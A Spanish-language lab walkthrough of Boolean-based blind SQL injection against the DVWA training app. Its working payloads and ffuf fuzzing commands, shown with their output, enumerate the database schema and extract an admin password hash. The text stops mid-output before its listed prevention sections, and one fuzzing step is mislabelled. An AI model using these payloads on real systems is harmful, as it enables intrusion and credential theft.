# Blind SQL Injection

## Índice

- [Blind SQL Injection](#blind-sql-injection)
  - [Índice](#índice)
  - [1. Introducción](#1-introducción)
    - [Tipos de Blind SQLi](#tipos-de-blind-sqli)
  - [2. Blind SQL Injection en acción](#2-blind-sql-injection-en-acción)
    - [Nivel de seguridad Low](#nivel-de-seguridad-low)
      - [Nombre de la base de datos](#nombre-de-la-base-de-datos)
      - [Automatización con FFUF (longitud)](#automatización-con-ffuf-longitud)
      - [UNION y LIKE](#union-y-like)
      - [Función substr()](#función-substr)
      - [Automatización con FFUF (nombre)](#automatización-con-ffuf-nombre)
      - [Tablas y campos](#tablas-y-campos)
        - [Nombre de las tablas](#nombre-de-las-tablas)
        - [Número y nombre de los campos](#número-y-nombre-de-los-campos)
      - [Extracción de información](#extracción-de-información)
    - [Nivel de seguridad Medium](#nivel-de-seguridad-medium)
      - [Conexión con sqlmap (Medium)](#conexión-con-sqlmap-medium)
      - [Descubrir bases de datos (Medium)](#descubrir-bases-de-datos-medium)
      - [Tablas, campos y extracción (Medium)](#tablas-campos-y-extracción-medium)
      - [Hashcracking (Medium)](#hashcracking-medium)
    - [Nivel de seguridad High](#nivel-de-seguridad-high)
      - [Conexión con sqlmap (High)](#conexión-con-sqlmap-high)
      - [Descubrir bases de datos (High)](#descubrir-bases-de-datos-high)
      - [Tablas, campos y extracción (High)](#tablas-campos-y-extracción-high)
      - [Hashcracking (High)](#hashcracking-high)
  - [3. Revisión del código fuente](#3-revisión-del-código-fuente)
    - [Nivel Low — sin protección](#nivel-low--sin-protección)
    - [Nivel Medium — protección insuficiente](#nivel-medium--protección-insuficiente)
    - [Nivel High — sin validación de la cookie](#nivel-high--sin-validación-de-la-cookie)
  - [4. Prevención](#4-prevención)

---

## 1. Introducción

En un **ataque ciego** (_Blind SQLi_) la aplicación es vulnerable pero **no devuelve errores ni información directa** que confirme la ejecución de las consultas inyectadas. A diferencia del SQLi clásico, donde los resultados de la consulta se muestran directamente en la página, en el Blind SQLi el atacante debe inferir la información a partir del comportamiento indirecto de la aplicación.

### Tipos de Blind SQLi

- **Blind SQLi — Boolean Based**: se emplea el operador `AND` junto con alguna condición que devuelve un valor `true` o `false`. La respuesta de la aplicación permitirá saber si la condición inyectada se cumple o no, lo que posibilitará deducir información como el nombre de la base de datos, tablas, número de campos, contenido de los campos, etc. Es el tipo más habitual y requiere un gran número de peticiones para extraer información carácter a carácter.

- **Blind SQLi — Time Based**: similar al anterior en concepto, aunque ahora se deduce el resultado de la consulta por el **tiempo de respuesta**, al inyectarse un retardo mediante la función `SLEEP()` o similar. Si el servidor tarda en responder, la condición inyectada era verdadera. Es especialmente útil cuando la aplicación no diferencia visualmente entre respuesta verdadera y falsa.

- **Blind SQLi — Out of Band**: se inyecta una consulta que en función del resultado genera o no una **conexión de red hacia un equipo controlado por el atacante**, lo que permite deducir el resultado. Requiere que el servidor de base de datos tenga capacidad para realizar conexiones de salida (ej: DNS, HTTP). Es menos frecuente pero muy difícil de detectar.

> **Nota:** En la primera práctica se explicará el proceso manual de explotación y después se automatizará completamente el procedimiento mediante la herramienta `sqlmap`.

---

## 2. Blind SQL Injection en acción

El laboratorio empleado es **DVWA** (_Damn Vulnerable Web Application_), que ofrece distintos niveles de seguridad para practicar las técnicas de explotación.

---

### Nivel de seguridad Low

Tras configurar el nivel de seguridad en DVWA a `low`, se accede a la sección de _SQL Injection (Blind)_ donde aparece un formulario que permite saber si existe un usuario introduciendo su identificador numérico.

El comportamiento de la aplicación es el siguiente:

- Si se indica el `id` de un usuario real, la aplicación responde con el mensaje `User ID exists in the database.`

![Usuario existe](./imagenes/sql%20injection%20blind/01.png)

- Si se indica el `id` de un usuario inexistente, la aplicación responde con el mensaje `User ID is MISSING from the database.`

![Usuario no existe](./imagenes/sql%20injection%20blind/02.png)

Esto hace suponer que la consulta SQL subyacente es parecida a:

```sql
SELECT name FROM usuarios WHERE userid = '$id' LIMIT 1;
```

Realmente, si consultamos el fichero en el servidor podemos ver que la consulta es la siguiente:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;
```

Al inyectar el carácter `'` se obtiene un error, confirmando la presencia de la vulnerabilidad. Sin embargo, al inyectar `1' or 1=1#` no se visualizan todos los registros como ocurría en el SQLi clásico: estamos ante una **Blind SQLi Boolean Based**. Al proporcionar la aplicación dos únicas respuestas, se sabrá si la consulta se ejecutó con éxito o no en base al mensaje mostrado.

![SQL Injection Blind](./imagenes/sql%20injection%20blind/03.png)
![Resultado SQL Injection Blind](./imagenes/sql%20injection%20blind/04.png)

> **Recuerda:** Las técnicas de explotación directa (UNION-based, Error-based) no son efectivas aquí ya que la aplicación no muestra los resultados de las consultas. Hay que emplear técnicas de inferencia carácter a carácter.

---

#### Nombre de la base de datos

El proceso de enumeración comienza determinando la **longitud del nombre de la base de datos** mediante las funciones `length()` y `database()`.

**Payload base:**

```sql
1' and length(database())=1 #
```

Si la longitud del nombre de la base de datos es `1`, devolverá un registro (`User ID exists`); si no, devolverá el mensaje de ausencia. Se repite incrementando el número hasta obtener confirmación:

```sql
1' and length(database())=1 # --> User ID is MISSING from the database.
1' and length(database())=2 # --> User ID is MISSING from the database.
1' and length(database())=3 # --> User ID is MISSING from the database.
1' and length(database())=4 # --> User ID exists in the database.
```

El nombre de la base de datos tiene **4 caracteres**.

La petición HTTP correspondiente al caso exitoso es la siguiente.

```bash
GET /dvwa/vulnerabilities/sqli_blind/?id=1%27+and+length%28database%28%29%29%3D4+%23&Submit=Submit&user_token=de009f33ce2661227aaf11e43226a001 HTTP/1.1
Host: 192.168.100.4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/
Cookie: PHPSESSID=05vrlenivid0jpbnstavauijks; security=impossible
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

![Petición SQL Injection](./imagenes/sql%20injection%20blind/05.png)

La idea central del Blind SQLi Boolean Based es inyectar una condición de la forma `(algo siempre verdadero) AND (pregunta sobre la BD)`, de modo que como la primera parte siempre se cumple, la respuesta de la aplicación —`EXISTS` o `MISSING`— depende únicamente de si la segunda parte es verdadera o falsa, permitiendo extraer información de la base de datos carácter a carácter sin que la app muestre ningún dato directamente.

> **Nota:** En vez de usar un `id` de un usuario real, se puede usar el `id` de un usuario inexistente con el operador `OR`:
>
> ```sql
> 10' or length(database())=4 # --> User ID exists in the database.
> ```

---

#### Automatización con FFUF (longitud)

Para automatizar el descubrimiento de la longitud se crea un diccionario de números y se emplea `ffuf`:

```bash
┌──(kali㉿kali)-[~]
└─$ for i in {1..20}; do echo $i > logitud.txt; done

┌──(kali㉿kali)-[~]
└─$ cat longitud.txt
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20

┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=10'+union+select+null,null+where+database()+like+'FUZZ%25'%23&Submit=Submit" -w alfabeto.txt -b "PHPSESSID=05vrlenivid0jpbnstavauijks; security=low" -mr "ID exists"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=10'+union+select+null,null+where+database()+like+'FUZZ%25'%23&Submit=Submit
 :: Wordlist         : FUZZ: /home/kali/alfabeto.txt
 :: Header           : Cookie: PHPSESSID=05vrlenivid0jpbnstavauijks; security=low
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: ID exists
________________________________________________

d                       [Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 66ms]
:: Progress: [26/26] :: Job [1/1] :: 7 req/sec :: Duration: [0:00:03] :: Errors: 0 ::

```

| Parámetro | Descripción                                                                           |
| --------- | ------------------------------------------------------------------------------------- |
| `-u`      | URL objetivo con la posición `FUZZ` donde se inyecta el payload                       |
| `-w`      | Diccionario a emplear                                                                 |
| `-b`      | Cabecera `Cookie` para autenticación                                                  |
| `-mr`     | Filtro por expresión regular: solo muestra respuestas que contengan el texto indicado |

El resultado confirma que la longitud es `4`.

---

#### UNION y LIKE

Conocida la longitud, se descubre el nombre mediante el operador `UNION` y `LIKE`. Primero se determina el **número de columnas** de la consulta:

```sql
10' union select null   # --> error (no coincide el número de columnas)
```

La consulta original devuelve 2 columnas (`first_name`, `last_name`) y el UNION solo aporta 1 (`null`). Como no coinciden, SQL da error.

```sql
10' union select null,null # --> sin error (la consulta devuelve 2 columnas)
```

Ahora el UNION aporta 2 columnas (`null, null`), coincide con la consulta original y no da error. Además, como el usuario 10 no existe, el único resultado viene del `SELECT null, null`, que siempre devuelve una fila `EXISTS`.

Después se prueban letras una a una en la primera posición:

```sql
10' union select null,null where database() like 'a%' # --> MISSING
```

El usuario 10 no existe primera parte vacía. La BD no empieza por `a` segunda parte vacía. El UNION está vacío `MISSING`.

```sql
10' union select null,null where database() like 'b%' # --> MISSING
```

Igual que el anterior, la BD no empieza por `b` segunda parte vacía `MISSING`.

```sql
10' union select null,null where database() like 'c%' # --> MISSING
```

Igual que los anteriores, la BD no empieza por `c` segunda parte vacía `MISSING`.

```sql
10' union select null,null where database() like 'd%' # --> EXISTS
```

El usuario 10 no existe primera parte vacía. La BD **sí** empieza por `d` la segunda parte devuelve una fila con `(null, null)`. El UNION tiene una fila `EXISTS`.

Se repite para cada posición (`dv%`, `dvw%`, `dvwa%`) hasta descubrir que la base de datos se llama **`dvwa`**.

---

#### Función substr()

Método alternativo al anterior. La función `SUBSTRING(str, pos, len)` devuelve `len` caracteres de la cadena `str` empezando en la posición `pos`. Se comprueba carácter a carácter:

```sql
1' and (substring(database(),1,1))='a'# --> MISSING
1' and (substring(database(),1,1))='b'# --> MISSING
1' and (substring(database(),1,1))='c'# --> MISSING
1' and (substring(database(),1,1))='d'# --> EXISTS
```

Se continúa para las posiciones 2, 3 y 4 hasta reconstruir el nombre completo.

---

#### Automatización con FFUF (nombre)

El proceso anterior se puede automatizar para el caso de **LIKE** con un ataque **simple** en `ffuf` con un solo diccionario de posiciones, dado que solo hay una posición.

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+(database())LIKE 'FUZZ%25'&Submit=Submit" -w longitud.txt -b "PHPSESSID=05vrlenivid0jpbnstavauijks; security=low" -mr "ID exists"
```

El proceso anterior se automatiza para el caso de **substring** con un ataque **cluster bomb** en `ffuf` con dos diccionarios simultáneos: uno para la posición y otro para la letra en caso de hacer uso del método sql _substring_:

```bash
┌──(kali㉿kali)-[~]
└─$ for i in {a..z}; do echo $i >> alfabeto.txt; done

┌──(kali㉿kali)-[~]
└─$ echo "_" >> alfabeto.txt

┌──(kali㉿kali)-[~]
└─$ cat alfabeto.txt
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
_

┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+(substring(database(),POSICION,1))='LETRA'%23&Submit=Submit" -w longitud.txt:POSICION -w alfabeto.txt:LETRA -b "PHPSESSID=05vrlenivid0jpbnstavauijks; security=low" -mr "ID exists"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+(substring(database(),POSICION,1))='LETRA'%23&Submit=Submit
 :: Wordlist         : POSICION: /home/kali/longitud.txt
 :: Wordlist         : LETRA: /home/kali/alfabeto.txt
 :: Header           : Cookie: PHPSESSID=05vrlenivid0jpbnstavauijks; security=low
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: ID exists
________________________________________________

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 31ms]
    * LETRA: d
    * POSICION: 1

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 106ms]
    * LETRA: v
    * POSICION: 2

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 165ms]
    * LETRA: w
    * POSICION: 3

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 5145ms]
    * LETRA: a
    * POSICION: 4

:: Progress: [520/520] :: Job [1/1] :: 111 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```

| Parámetro              | Descripción                                                        |
| ---------------------- | ------------------------------------------------------------------ |
| `POSICION`             | Marcador sustituido por el diccionario de posiciones (1–4)         |
| `LETRA`                | Marcador sustituido por el diccionario alfanumérico                |
| `-w wordlist:MARCADOR` | Asocia un wordlist a un marcador específico                        |
| `-mr "ID exists"`      | Filtra respuestas que contengan `ID exists` (acierto del carácter) |

El resultado muestra: posición 1 `d`, posición 2 `v`, posición 3 `w`, posición 4 `a`. Nombre de la base de datos: **`dvwa`**.

---

#### Tablas y campos

##### Nombre de las tablas

Primero se descubre el **número de tablas**:

```sql
1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 # --> MISSING
1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 # --> MISSING
1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 # --> EXISTS
```

> **Nota:** La consulta `select count(table_name) from information_schema.tables where table_schema=database()` se apoya en `information_schema`, una base de datos especial de MySQL/MariaDB que almacena metadatos sobre la propia base de datos (tablas, columnas, tipos de datos, etc.). Concretamente, `information_schema.tables` tiene una fila por cada tabla del sistema, por lo que `count(table_name)` cuenta cuántas tablas existen. El filtro `where table_schema=database()` limita el conteo a las tablas de la base de datos actual, descartando el resto del sistema.

A continuación se descubre la **longitud del nombre** de cada tabla mediante `length(substr(...))` y la cláusula `limit N,1` para iterar sobre cada tabla:

```sql
-- Primera tabla (limit 0,1): longitud = 12  → security_log
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=12 #

-- Segunda tabla (limit 1,1): longitud = 5  → users
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 #

-- Tercera tabla (limit 2,1): longitud = 9  → guestbook
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1))=9 #

-- Cuarta tabla (limit 3,1): longitud = 10  → access_log
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1))=10 #
```

> **Nota:** Los números de longitud corresponden exactamente al número de caracteres de cada nombre: `security_log` = 12, `users` = 5, `guestbook` = 9, `access_log` = 10. El orden de las tablas puede variar según la versión de MySQL/MariaDB, por lo que `limit 0,1` no siempre devuelve la misma tabla. En la práctica real estos valores se descubren probando incrementalmente con Blind SQLi igual que se hizo con el nombre de la base de datos.

Finalmente se descubre el **nombre carácter a carácter** con `substr()` y `ffuf`:

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+(substr((select+table_name+from+information_schema.tables+where+table_schema%3d'dvwa'+limit+1,1),POSICION,1))%3d'LETRA'%23&Submit=Submit" -w longitud.txt:POSICION -w alfabeto.txt:LETRA -b "PHPSESSID=05vrlenivid0jpbnstavauijks; security=low" -mr "ID exists"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+(substr((select+table_name+from+information_schema.tables+where+table_schema%3d'dvwa'+limit+1,1),POSICION,1))%3d'LETRA'%23&Submit=Submit
 :: Wordlist         : POSICION: /home/kali/longitud.txt
 :: Wordlist         : LETRA: /home/kali/alfabeto.txt
 :: Header           : Cookie: PHPSESSID=05vrlenivid0jpbnstavauijks; security=low
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: ID exists
________________________________________________

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 39ms]
    * LETRA: e
    * POSICION: 3

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 65ms]
    * LETRA: s
    * POSICION: 2

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 175ms]
    * LETRA: r
    * POSICION: 4

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 583ms]
    * LETRA: s
    * POSICION: 5

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 828ms]
    * LETRA: u
    * POSICION: 1

:: Progress: [520/520] :: Job [1/1] :: 71 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

> **Nota:** Para las siguientes tablas se cambia `limit 1,1` por `limit 2,1` y así sucesivamente.

Resultado: tablas descubiertas **`security_log`**, **`users`**, **`guestbook`** y **`access_log`**,

##### Número y nombre de los campos

Se descubre el **número de campos** de la tabla `users`:

```sql
1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=10 # --> EXISTS
```

Se descubre la longitud y el nombre de cada campo del mismo modo que con las tablas, usando `information_schema.columns`:

```sql
-- Longitud del primer campo: 7 caracteres
1' and length(substr((select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1),1))=7#
```

Campos descubiertos mediante automatización con `ffuf`:

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+substr((select+column_name+from+information_schema.columns+where+table_schema%3d'dvwa'+and+table_name%3d'users'+limit+0,1),POSICION,1)%3d'LETRA'%23&Submit=Submit" \
  -w longitud.txt:POSICION \
  -w alfabeto.txt:LETRA \
  -b 'PHPSESSID=05vrlenivid0jpbnstavauijks; security=low' \
  -mr "ID exists" \
  -v

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+substr((select+column_name+from+information_schema.columns+where+table_schema%3d'dvwa'+and+table_name%3d'users'+limit+0,1),POSICION,1)%3d'LETRA'%23&Submit=Submit
 :: Wordlist         : POSICION: /home/kali/longitud.txt
 :: Wordlist         : LETRA: /home/kali/alfabeto.txt
 :: Header           : Cookie: PHPSESSID=05vrlenivid0jpbnstavauijks; security=low
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: ID exists
________________________________________________

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 38ms]
| URL | http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+substr((select+column_name+from+information_schema.columns+where+table_schema%3d'dvwa'+and+table_name%3d'users'+limit+0,1),7,1)%3d'd'%23&Submit=Submit
    * LETRA: d
    * POSICION: 7

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 41ms]
| URL | http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+substr((select+column_name+from+information_schema.columns+where+table_schema%3d'dvwa'+and+table_name%3d'users'+limit+0,1),3,1)%3d'e'%23&Submit=Submit
    * LETRA: e
    * POSICION: 3

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 37ms]
| URL | http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+substr((select+column_name+from+information_schema.columns+where+table_schema%3d'dvwa'+and+table_name%3d'users'+limit+0,1),4,1)%3d'r'%23&Submit=Submit
    * LETRA: r
    * POSICION: 4

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 47ms]
| URL | http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+substr((select+column_name+from+information_schema.columns+where+table_schema%3d'dvwa'+and+table_name%3d'users'+limit+0,1),2,1)%3d's'%23&Submit=Submit
    * LETRA: s
    * POSICION: 2

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 92ms]
| URL | http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+substr((select+column_name+from+information_schema.columns+where+table_schema%3d'dvwa'+and+table_name%3d'users'+limit+0,1),1,1)%3d'u'%23&Submit=Submit
    * LETRA: u
    * POSICION: 1

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 32ms]
| URL | http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+substr((select+column_name+from+information_schema.columns+where+table_schema%3d'dvwa'+and+table_name%3d'users'+limit+0,1),5,1)%3d'_'%23&Submit=Submit
    * LETRA: _
    * POSICION: 5

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 3606ms]
| URL | http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+substr((select+column_name+from+information_schema.columns+where+table_schema%3d'dvwa'+and+table_name%3d'users'+limit+0,1),6,1)%3d'i'%23&Submit=Submit
    * LETRA: i
    * POSICION: 6

:: Progress: [540/540] :: Job [1/1] :: 51 req/sec :: Duration: [0:02:50] :: Errors: 0 ::
"
```

| `limit` | Campo             |
| ------- | ----------------- |
| `0,1`   | `user_id`         |
| `1,1`   | `first_name`      |
| `2,1`   | `last_name`       |
| `3,1`   | `user`            |
| `4,1`   | `password`        |
| `5,1`   | `avatar`          |
| `6,1`   | `last_login`      |
| `7,1`   | `failed_login`    |
| `8,1`   | `role`            |
| `9,1`   | `account_enabled` |

> **Nota:** Outra alternativa é tantear nomes habituais para os campos en lugar de fuzzear carácter a carácter.

```sql
-- Comproba se existe un campo chamado 'username'
1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='username')=1 #
```

> Resultado: `User ID is MISSING from the database` → o campo **username** non existe.

```sql
-- Comproba se existe un campo chamado 'user'
1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='user')=1 #
```

> Resultado: `User ID exists in the database` → o campo **user** existe

---

#### Extracción de información

Una vez conocidos los nombres de los campos, se puede repetir el proceso para conocer su contenido; por ejemplo, para extraer el _hash_ del usuario _admin_ se emplearían los siguientes modelos de consultas:

- Tamaño del _hash_ (para automatizarlo con ffuf el archivo `longitud.txt` debe tener al menos números del 1 al 32):

```sql
1' and length(substr((select password from users where user='admin'),1))=x#
```

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+length(substr((select+password+from+users+where+user%3d'admin'),1))%3dFUZZ%23&Submit=Submit" \
  -w longitud.txt \
  -b 'PHPSESSID=05vrlenivid0jpbnstavauijks; security=low' \
  -mr "ID exists"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+length(substr((select+password+from+users+where+user%3d'admin'),1))%3dFUZZ%23&Submit=Submit
 :: Wordlist         : FUZZ: /home/kali/longitud.txt
 :: Header           : Cookie: PHPSESSID=05vrlenivid0jpbnstavauijks; security=low
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: ID exists
________________________________________________

32                      [Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 2448ms]
:: Progress: [33/33] :: Job [1/1] :: 7 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

```

> Resultado: `32` → el _hash_ del usuario _admin_ tiene **32 caracteres**.

- _Hash_ del usuario _admin_:

```sql
1' and (substr((select password from users where user='admin'),1,1))='x'#
```

> Actualizando el archivo `alfabeto.txt` para incluir además los números del 0 al 9, se puede automatizar el proceso con ffuf y obtener el hash resultante:
> **`5f4dcc3b5aa765d61d8327deb882cf99`**

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+substr((select+password+from+users+where+user%3d'admin'),POSICION,1)%3d'LETRA'%23&Submit=Submit" \
  -w longitud.txt:POSICION \
  -w alfabeto.txt:LETRA \
  -b 'PHPSESSID=05vrlenivid0jpbnstavauijks; security=low' \
  -mr "ID exists"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.4/dvwa/vulnerabilities/sqli_blind/?id=1'+and+substr((select+password+from+users+where+user%3d'admin'),POSICION,1)%3d'LETRA'%23&Submit=Submit
 :: Wordlist         : POSICION: /home/kali/longitud.txt
 :: Wordlist         : LETRA: /home/kali/alfabeto.txt
 :: Header           : Cookie: PHPSESSID=05vrlenivid0jpbnstavauijks; security=low
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: ID exists
________________________________________________

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 22ms]
    * LETRA: b
    * POSICION: 25

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 30ms]
    * LETRA: b
    * POSICION: 8

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 32ms]
    * LETRA: c
    * POSICION: 5

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 14ms]
    * LETRA: c
    * POSICION: 6

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 15ms]
    * LETRA: d
    * POSICION: 4

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 33ms]
    * LETRA: c
    * POSICION: 29

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 16ms]
    * LETRA: d
    * POSICION: 15

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 31ms]
    * LETRA: d
    * POSICION: 18

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 9ms]
    * LETRA: d
    * POSICION: 23

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 43ms]
    * LETRA: e
    * POSICION: 24

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 54ms]
    * LETRA: f
    * POSICION: 2

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 45ms]
    * LETRA: f
    * POSICION: 30

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 103ms]
    * LETRA: 1
    * POSICION: 17

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 59ms]
    * LETRA: 2
    * POSICION: 28

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 27ms]
    * LETRA: 2
    * POSICION: 21

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 44ms]
    * LETRA: 3
    * POSICION: 7

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 49ms]
    * LETRA: 3
    * POSICION: 20

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 21ms]
    * LETRA: 4
    * POSICION: 3

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 4555ms]
    * LETRA: a
    * POSICION: 10

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 67ms]
    * LETRA: 5
    * POSICION: 1

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 4582ms]
    * LETRA: a
    * POSICION: 11

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 158ms]
    * LETRA: 5
    * POSICION: 9

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 155ms]
    * LETRA: 5
    * POSICION: 14

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 49ms]
    * LETRA: 6
    * POSICION: 13

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 93ms]
    * LETRA: 6
    * POSICION: 16

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 75ms]
    * LETRA: 7
    * POSICION: 12

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 129ms]
    * LETRA: 7
    * POSICION: 22

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 47ms]
    * LETRA: 8
    * POSICION: 19

[Status: 200, Size: 4703, Words: 249, Lines: 114, Duration: 99ms]
    * LETRA: 8
    * POSICION: 26

